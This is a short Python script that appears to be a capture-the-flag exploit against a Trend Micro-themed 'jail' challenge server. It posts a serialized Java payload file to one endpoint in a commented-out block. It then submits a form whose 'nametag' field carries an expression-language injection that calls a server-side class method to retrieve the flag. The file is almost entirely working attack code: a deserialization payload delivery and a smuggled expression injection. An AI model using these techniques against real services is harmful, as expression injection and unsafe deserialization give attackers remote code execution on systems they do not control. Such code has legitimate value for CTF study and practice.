import requests
import urllib

url = 'http://flagmarshal.xyz/'
xml = open('exp/exp1.ser','rb').read()

# headers = {'Content-Type': 'application/octet-stream'}
# r = requests.post(url+'jail',data=xml,headers=headers)
# print r.text

data = {
	"key": "Fo0lMe0nce5hameOnUFoo1MeUCantGetF0oledAgain",
	"nametag": "'+T(com.trendmicro.jail.Flag).getFlag()+'"
}
r = requests.post(url+'Office',data=data)
print r.content
